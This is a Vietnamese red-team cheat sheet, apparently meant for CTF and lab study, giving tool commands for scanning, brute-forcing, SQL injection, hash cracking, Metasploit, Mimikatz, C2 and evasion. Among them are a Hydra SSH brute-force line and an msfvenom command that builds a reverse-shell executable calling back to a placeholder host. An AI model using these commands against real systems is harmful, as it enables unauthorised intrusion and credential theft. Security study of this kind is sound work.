

## 🔴 **RED TEAM CHEAT SHEET** (Tổng hợp công cụ & kiến thức)

---

### ✅ **1. RECON & ENUMERATION (Trinh sát và thu thập thông tin)**

|Công cụ|Mục đích chính|Lưu ý / Cách dùng|
|---|---|---|
|**Nmap**|Quét cổng, phát hiện dịch vụ, hệ điều hành|`nmap -sC -sV -A IP`|
|**Gobuster**|Liệt kê thư mục (dir), VHOST, subdomain|`gobuster dir/vhost/dns` với wordlist|
|**Sublist3r**|Thu thập subdomain|`sublist3r -d example.com`|
|**Whois / Nslookup / Dig**|Điều tra domain|Được dùng để thu thập thông tin cơ bản về mục tiêu|
|**theHarvester**|Thu thập email, subdomain từ OSINT|`theHarvester -d target.com -b google`|

---

### ✅ **2. BRUTE FORCE**

|Công cụ|Mục đích chính|Lưu ý / Cách dùng|
|---|---|---|
|**Hydra**|Brute-force login giao thức: ssh, ftp, http|`hydra -l admin -P rockyou.txt ssh://ip`|
|**Burp Suite (Intruder)**|Brute-force web login|Sử dụng Intruder để tấn công form đăng nhập|
|**CeWL**|Tạo wordlist tùy chỉnh từ website|`cewl http://site -w wordlist.txt`|

---

### ✅ **3. WEB EXPLOITATION**

|Kỹ thuật / Tool|Mô tả ngắn|Ghi chú|
|---|---|---|
|**Burp Suite**|Proxy traffic, Repeater, Intruder, Decoder|Dùng để kiểm tra web request/response|
|**SQLMap**|Khai thác SQL Injection|`sqlmap -u URL --dbs`|
|**XSS, CSRF, IDOR, SSRF**|Kỹ thuật khai thác web phổ biến|Tùy vào từng web app mà sử dụng|
|**SSRF**|Tấn công thông qua server gửi request nội bộ|Được dùng để scan nội bộ, lấy metadata|
|**IDOR**|Truy cập tài nguyên không được phép|Kiểm tra thay đổi ID hoặc tham số URL|

---

### ✅ **4. PASSWORD CRACKING**

| Công cụ             | Mục đích                    | Cách dùng                                   |
| ------------------- | --------------------------- | ------------------------------------------- |
| **John the Ripper** | Crack password từ hash file | `john hash.txt --wordlist=rockyou.txt`      |
| **Hashcat**         | GPU-based cracking tool     | Hiệu năng cao hơn, nhưng cần driver phù hợp |
| **rockyou.txt**     | Wordlist phổ biến           | Có sẵn trong Kali (`/usr/share/wordlists/`) |

---

### ✅ **5. EXPLOITATION**

|Công cụ|Mục đích chính|Ghi chú|
|---|---|---|
|**Metasploit Framework**|Khai thác, tạo payload, shell|`msfconsole` để vào console|
|**Searchsploit**|Tìm khai thác trong Exploit-DB offline|`searchsploit vsftpd`|
|**msfvenom**|Tạo payload (windows, php, reverse shell)|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe`|

---

### ✅ **6. POST-EXPLOITATION**

|Kỹ thuật|Mô tả ngắn|
|---|---|
|**Privilege Escalation**|Tìm cách nâng quyền sau khi đã truy cập|
|**Enum Scripts**|Liệt kê thông tin hệ thống như `LinPEAS`, `WinPEAS`, `PowerUp`|
|**Mimikatz**|Trích xuất mật khẩu trên Windows|
|**Persistence**|Duy trì quyền truy cập hệ thống|

---

### ✅ **7. RED TEAM ADVANCED TOOLS**

|Tool / Kỹ thuật|Mục đích|
|---|---|
|**C2 (Command & Control)** như Cobalt Strike, Sliver|Điều khiển từ xa sau khi khai thác|
|**Obfuscation / Evasion**|Lẩn tránh AV, EDR|
|**Payload Customization**|Tùy biến shellcode|
|**FlareVM**|Môi trường Windows cho reverse engineering|

---

### ✅ **8. LABS & THỰC HÀNH**

|Platform|Nội dung|
|---|---|
|**TryHackMe**|Phòng lab từ cơ bản đến nâng cao|
|**Hack The Box**|Thử thách hệ thống thực tế|
|**VulnHub**|Tải máy ảo dễ bị khai thác|

---

## ⚠️ **Mẹo Ghi Nhớ**

- **Nmap → Gobuster/Subdomain → Hydra → SQLMap/Burp → Metasploit → PE → Flag**
    
- Luôn kiểm tra đầu vào người dùng (input), đường dẫn (URL), và response trả về.
    
- Ghi chú mỗi bước, log lại mọi tương tác để dễ viết báo cáo.
    

---

